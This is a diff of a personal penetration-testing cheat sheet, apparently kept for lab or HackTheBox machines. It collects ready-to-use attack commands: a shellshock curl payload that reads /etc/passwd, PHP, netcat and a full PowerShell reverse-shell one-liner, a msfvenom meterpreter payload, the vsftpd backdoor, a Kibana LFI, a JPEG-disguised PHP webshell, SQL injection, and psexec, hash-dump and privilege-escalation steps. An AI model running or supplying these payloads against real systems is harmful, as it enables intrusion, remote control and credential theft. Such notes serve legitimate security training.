@@ -1,22 +1,23 @@
-# easy way to transfer files
+# Transfer files
 python -m http.server <port> (python3)
 python –m SimpleHTTPServer (python2)
 wget -r http://<ip address>:<port>
-
-
- # or 
- scp -r -p user@serveur1:chemin/vers/dossier/source user@serveur2:chemin/vers/dossier/destination
-
-# update reverse shell 
-python -c 'import pty; pty.spawn("/bin/bash")'  
+scp -r -p user@serveur1:chemin/vers/dossier/source user@serveur2:chemin/vers/dossier/destination
 
 # start apache server
 /etc/init.d/apache2 start
 
+# repository kali
+https://docs.kali.org/general-use/kali-linux-sources-list-repositories
+
+# grep recursif
+grep -ir 'password'
+
+### Vulnerabilities ### 
 # shellshock with cgi 
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
 http://localhost:8080/cgi-bin/vulnerable
-#to get reverse shell with shellshock
+# reverse shell with shellshock
 https://exploit-db.com/exploits/34900/
 
 # heartbleed check
@@ -24,15 +25,7 @@ nmap -sV -script=ssl-heartbleed [host]
 exploit : https://sathisharthars.com/2014/06/10/exploit-heartbleed-openssl-vulnerability-using-kali-linux/
 other exploit : https://gist.github.com/eelsivart/10174134
 
-# repository kali
-https://docs.kali.org/general-use/kali-linux-sources-list-repositories
-
-# upgrade shell
-python -c 'import pty; pty.spawn("/bin/bash")'
-
-# grep recursif
-grep -ir 'password'
-
+$searchsploit Samba 3.0.20  
 
 #VSFTPD v2.3.4 Backdoor Command Execution  
 msf > use exploit/unix/ftp/vsftpd_234_backdoor  
@@ -45,7 +38,19 @@ msf exploit(vsftpd_234_backdoor) > exploit
 open port 21 then nc on 6200  
 https://medium.com/@mplacio/metasploitable-1-vsftpd-2-3-4-c4d3ea5db208  
 
-#SMB  
+#List index elasticsearch  
+curl 'localhost:9200/_cat/indices?v'
+
+#CMS Made simple   
+https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html  
+
+#LFI kibana
+curl 'http://10.10.10.115:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js'
+
+# backdoor Magento
+https://github.com/lavalamp-/LavaMagentoBD
+
+### SMB ###    
 nmap --script smb-vuln* -p 445 192.168.1.101
 smbmap -H 10.10.10.123 -u root -p 445  
 nmap --script smb-enum-shares -p139 10.10.10.123   
@@ -61,54 +66,44 @@ curl --upload-file /path/to/file.ext -u 'DOMAIN\Username' smb://172.16.17.52/Sha
 dig axfr <subdomain>@10.10.10.123  
 
 #Visualize strings in binary files  
-tool -> bless  
+bless (tool) 
 
 #Read pst file  
-tool -> readpst  
+readpst (tool)  
 
 #Trick SQLI   
 creating an account with the username user’ OR 1=1#  
 and when you logging in you see all notes  
 
-#reverse shell windows   
-nc64.exe -e cmd.exe [IP] [Port]  
-#reverse shell one-liner Powershell
-$client = New-Object System.Net.Sockets.TCPClient("IP",[port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
-#Metasploit  
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.251 LPORT=4444 -f exe -a x64 -o payload.exe — platform windows  
-msf> use exploit/multi/handler  
-> set payload windows/x64/meterpreter/reverse_tcp  
-
-#privesc metasploit  
-meterpreter > run post/multi/recon/local_exploit_suggester  
+### Reverse shell ###  
+# upgrade reverse shell 
+python -c 'import pty; pty.spawn("/bin/bash")'  
 
 #reverse shell php  
 php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'  
 
-#RCE SAMBA  
-$searchsploit Samba 3.0.20  
+# reverse shell windows   
+nc64.exe -e cmd.exe [IP] [Port]  
+#reverse shell one-liner Powershell
+$client = New-Object System.Net.Sockets.TCPClient("IP",[port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-#List index elasticsearch  
-curl 'localhost:9200/_cat/indices?v'
+# Metasploit  
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.251 LPORT=4444 -f exe -a x64 -o payload.exe — platform windows  
+msf> use exploit/multi/handler  
+> set payload windows/x64/meterpreter/reverse_tcp  
+
+# privesc metasploit  
+meterpreter > run post/multi/recon/local_exploit_suggester  
 
 
-#CMS Made simple   
-https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html  
-
-#LFI kibana
-curl 'http://10.10.10.115:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js'
-
-#replace
+### Bash ###   
+# replace
 sed -i -e "s/string1/string2/g" file
 
-#one liner
+# one liner
 echo -e 'input { \n  execute { \n    command => "ls"  \n    interval => 30 \n  } \n }' > test
 
-#backdoor Magento
-https://github.com/lavalamp-/LavaMagentoBD
-
-#Vi keep only first word for each line
+# Vi keep only first word for each line
 :s/\(\s*\w\+\).*/\1
 #delete first worst for each line
 awk '{print $NF}' file
@@ -129,13 +124,13 @@ f = open('exploit.php', 'w')
 f.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>') # This is the magic header for a JPEG image  
 f.close()  
 
-#Users enumeration
+# Users enumeration
 lookupsid.py
 
 port 49669 winrm
 connection with tool evilwinrm 
 
-#Execute processes on other systems
+# Execute processes on other systems
 psexec.py pentest:'P3nT3st!'@10.10.10.152
 
 #Command injection (ping)
@@ -144,11 +139,10 @@ psexec.py pentest:'P3nT3st!'@10.10.10.152
 #Privesc (linEnum)
 https://github.com/Z3R0th-13/LinEnum.git
 
-
-#SUID
+# suid files
 find / -perm -u=s -type f 2>/dev/null
 
-#Cat various-lines-script in file without vim
+# Cat various-lines-script in file without vim
 cat >fusermount.c<<EOF
 #include <stdio.h>
 #include <stdlib.h>
@@ -163,20 +157,19 @@ int main(int argc, char **argv)
 }
 EOF
 
-
-
+# webshell aspx
 cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
 
 
 #Get .NET Versions
 c:\Users>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
 
-#Windows privesc
+# Windows privesc
 $ git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
 $ python windows-exploit-suggester.py --update
 meterpreter > execute -f "cmd.exe /c systeminfo > systeminfo.txt"
 meterpreter > download systeminfo.txt
 $ python windows-exploit-suggester.py --database 2019-09-25-mssb.xls --systeminfo ../systeminfo.txt --quiet  
 
-#Get hash windows 
+# Get hash windows 
 meterpreter > run post/windows/gather/smart_hashdump
